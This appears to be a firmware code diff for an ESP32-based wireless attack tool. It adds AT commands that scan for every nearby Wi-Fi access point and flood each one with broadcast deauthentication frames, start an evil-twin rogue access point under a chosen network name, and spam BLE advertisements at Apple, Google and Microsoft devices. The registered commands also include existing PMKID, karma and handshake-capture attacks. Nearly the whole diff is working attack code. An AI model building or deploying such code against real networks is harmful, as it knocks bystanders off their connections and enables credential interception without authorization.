@@ -19,6 +19,8 @@
 #include "esp_random.h"
 
 #include "at_custom_wifi_cmd.h"
+#include "m1_rpc_eviltwin.h"
+#include "m1_rpc_ble.h"
 
 static const char *TAG = "M1WiFi";
 
@@ -45,6 +47,9 @@ static volatile bool s_karma_stop_flag = false;
 
 static TaskHandle_t s_hscap_task_handle = NULL;
 static volatile bool s_hscap_stop_flag = false;
+
+static TaskHandle_t s_deauth_all_task_handle = NULL;
+static volatile bool s_deauth_all_stop_flag = false;
 
 /* ------------------------------------------------------------------ */
 /*  Helpers                                                            */
@@ -103,6 +108,7 @@ static void stop_all_attacks(void)
     stop_task(&s_probe_task_handle, &s_probe_stop_flag);
     stop_task(&s_karma_task_handle, &s_karma_stop_flag);
     stop_task(&s_hscap_task_handle, &s_hscap_stop_flag);
+    stop_task(&s_deauth_all_task_handle, &s_deauth_all_stop_flag);
 }
 
 /* Last enter_monitor failure reason (short code), for error reporting */
@@ -482,8 +488,13 @@ static uint8_t at_setup_cmd_m1deauth(uint8_t para_num)
 
 static uint8_t at_exe_cmd_m1deauthstop(uint8_t *cmd_name)
 {
+    /* Also halt a broadcast sweep if one is running. */
+    if (s_deauth_all_task_handle) {
+        stop_task(&s_deauth_all_task_handle, &s_deauth_all_stop_flag);
+    }
+
     if (!s_deauth_task_handle) {
-        at_send_line("+M1DEAUTHSTOP:0\r\n");
+        at_send_line("+M1DEAUTHSTOP:%ld\r\n", (long)s_deauth_sent_count);
         return ESP_AT_RESULT_CODE_OK;
     }
 
@@ -1371,6 +1382,156 @@ static uint8_t at_setup_cmd_m1hscap(uint8_t para_num)
 }
 
 /* ------------------------------------------------------------------ */
+/*  AT+M1DEAUTHALL  (exec) — scan, then broadcast-deauth every AP      */
+/* ------------------------------------------------------------------ */
+
+#define DEAUTH_ALL_MAX 32
+static uint8_t s_da_bssid[DEAUTH_ALL_MAX][6];
+static uint8_t s_da_channel[DEAUTH_ALL_MAX];
+static int s_da_count = 0;
+
+static void deauth_all_task_func(void *arg)
+{
+    uint8_t frame[DEAUTH_FRAME_LEN];
+    const uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    int32_t sent = 0;
+
+    while (!s_deauth_all_stop_flag) {
+        for (int i = 0; i < s_da_count && !s_deauth_all_stop_flag; i++) {
+            esp_wifi_set_channel(s_da_channel[i], WIFI_SECOND_CHAN_NONE);
+            s_monitor_channel = s_da_channel[i];
+            build_deauth_frame(frame, bcast, s_da_bssid[i], 7);
+            for (int r = 0; r < 3; r++) {
+                esp_wifi_80211_tx(WIFI_IF_STA, frame, DEAUTH_FRAME_LEN, false);
+            }
+            sent += 3;
+            s_deauth_sent_count = sent;
+            vTaskDelay(pdMS_TO_TICKS(20));
+        }
+    }
+    s_deauth_sent_count = sent;
+    s_deauth_all_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+static uint8_t at_exe_cmd_m1deauthall(uint8_t *cmd_name)
+{
+    static wifi_ap_record_t recs[DEAUTH_ALL_MAX];
+    uint16_t num = DEAUTH_ALL_MAX;
+
+    if (s_deauth_all_task_handle) {
+        at_send_line("+M1DEAUTHALL:ERR:RUNNING\r\n");
+        return ESP_AT_RESULT_CODE_ERROR;
+    }
+
+    /* Drop monitor mode to run a managed-mode scan for targets. */
+    exit_monitor();
+    if (esp_wifi_scan_start(NULL, true) != ESP_OK) {
+        at_send_line("+M1DEAUTHALL:ERR:SCAN\r\n");
+        return ESP_AT_RESULT_CODE_ERROR;
+    }
+    if (esp_wifi_scan_get_ap_records(&num, recs) != ESP_OK) {
+        at_send_line("+M1DEAUTHALL:ERR:RECORDS\r\n");
+        return ESP_AT_RESULT_CODE_ERROR;
+    }
+
+    s_da_count = (num > DEAUTH_ALL_MAX) ? DEAUTH_ALL_MAX : (int)num;
+    for (int i = 0; i < s_da_count; i++) {
+        memcpy(s_da_bssid[i], recs[i].bssid, 6);
+        s_da_channel[i] = recs[i].primary;
+    }
+    if (s_da_count == 0) {
+        at_send_line("+M1DEAUTHALL:0\r\n");
+        return ESP_AT_RESULT_CODE_OK;
+    }
+
+    if (!enter_monitor(s_da_channel[0])) {
+        at_send_line("+M1DEAUTHALL:ERR:MONITOR:%s\r\n", s_monitor_err);
+        return ESP_AT_RESULT_CODE_ERROR;
+    }
+
+    s_deauth_sent_count = 0;
+    s_deauth_all_stop_flag = false;
+    xTaskCreate(deauth_all_task_func, "m1deauthall", 4096, NULL, 5,
+                &s_deauth_all_task_handle);
+    at_send_line("+M1DEAUTHALL:%d\r\n", s_da_count);
+    return ESP_AT_RESULT_CODE_OK;
+}
+
+/* ------------------------------------------------------------------ */
+/*  AT+M1EVILTWIN=1,"<ssid>",<channel>  /  AT+M1EVILTWIN=0             */
+/* ------------------------------------------------------------------ */
+
+static uint8_t at_setup_cmd_m1eviltwin(uint8_t para_num)
+{
+    int32_t enable = 0;
+    if (esp_at_get_para_as_digit(0, &enable) != ESP_AT_PARA_PARSE_RESULT_OK) {
+        return ESP_AT_RESULT_CODE_ERROR;
+    }
+
+    if (enable == 0) {
+        return (m1_eviltwin_stop() == M1_OK)
+            ? ESP_AT_RESULT_CODE_OK : ESP_AT_RESULT_CODE_ERROR;
+    }
+
+    uint8_t *ssid_str = NULL;
+    int32_t channel = 1;
+    if (para_num < 2 ||
+        esp_at_get_para_as_str(1, &ssid_str) != ESP_AT_PARA_PARSE_RESULT_OK ||
+        !ssid_str) {
+        at_send_line("+M1EVILTWIN:ERR:SSID\r\n");
+        return ESP_AT_RESULT_CODE_ERROR;
+    }
+    if (para_num >= 3 &&
+        esp_at_get_para_as_digit(2, &channel) != ESP_AT_PARA_PARSE_RESULT_OK) {
+        return ESP_AT_RESULT_CODE_ERROR;
+    }
+    if (channel < 1 || channel > 14) channel = 1;
+
+    uint8_t ssid_len = (uint8_t)strlen((const char *)ssid_str);
+    if (ssid_len == 0 || ssid_len > 32) {
+        at_send_line("+M1EVILTWIN:ERR:SSID\r\n");
+        return ESP_AT_RESULT_CODE_ERROR;
+    }
+
+    uint8_t payload[1 + 32 + 1];
+    payload[0] = ssid_len;
+    memcpy(payload + 1, ssid_str, ssid_len);
+    payload[1 + ssid_len] = (uint8_t)channel;
+
+    if (m1_eviltwin_start(payload, (uint16_t)(2 + ssid_len)) != M1_OK) {
+        at_send_line("+M1EVILTWIN:ERR:%s\r\n", m1_eviltwin_last_err());
+        return ESP_AT_RESULT_CODE_ERROR;
+    }
+    return ESP_AT_RESULT_CODE_OK;
+}
+
+/* ------------------------------------------------------------------ */
+/*  AT+M1BLESPAM=<mode>  /  AT+M1BLESPAM=0                              */
+/*    mode: 0 = stop; else bitmask 1=Apple 2=Google 4=Microsoft        */
+/* ------------------------------------------------------------------ */
+
+static uint8_t at_setup_cmd_m1blespam(uint8_t para_num)
+{
+    int32_t mode = 0;
+    if (esp_at_get_para_as_digit(0, &mode) != ESP_AT_PARA_PARSE_RESULT_OK) {
+        return ESP_AT_RESULT_CODE_ERROR;
+    }
+
+    if (mode == 0) {
+        return (m1_ble_spam_stop() == M1_OK)
+            ? ESP_AT_RESULT_CODE_OK : ESP_AT_RESULT_CODE_ERROR;
+    }
+
+    m1_status_t st = m1_ble_spam_start((uint8_t)mode);
+    if (st != M1_OK) {
+        at_send_line("+M1BLESPAM:ERR:STATUS:%d\r\n", (int)st);
+        return ESP_AT_RESULT_CODE_ERROR;
+    }
+    return ESP_AT_RESULT_CODE_OK;
+}
+
+/* ------------------------------------------------------------------ */
 /*  Command registration table                                        */
 /* ------------------------------------------------------------------ */
 
@@ -1384,6 +1545,9 @@ static const esp_at_cmd_struct s_wifi_cmd_list[] = {
     {"+M1PMKID",     NULL, NULL, at_setup_cmd_m1pmkid,    NULL},
     {"+M1KARMA",     NULL, NULL, at_setup_cmd_m1karma,    NULL},
     {"+M1HSCAP",     NULL, NULL, at_setup_cmd_m1hscap,    NULL},
+    {"+M1DEAUTHALL", NULL, NULL, NULL, at_exe_cmd_m1deauthall},
+    {"+M1EVILTWIN",  NULL, NULL, at_setup_cmd_m1eviltwin, NULL},
+    {"+M1BLESPAM",   NULL, NULL, at_setup_cmd_m1blespam,  NULL},
 };
 
 bool esp_at_custom_wifi_cmd_register(void)
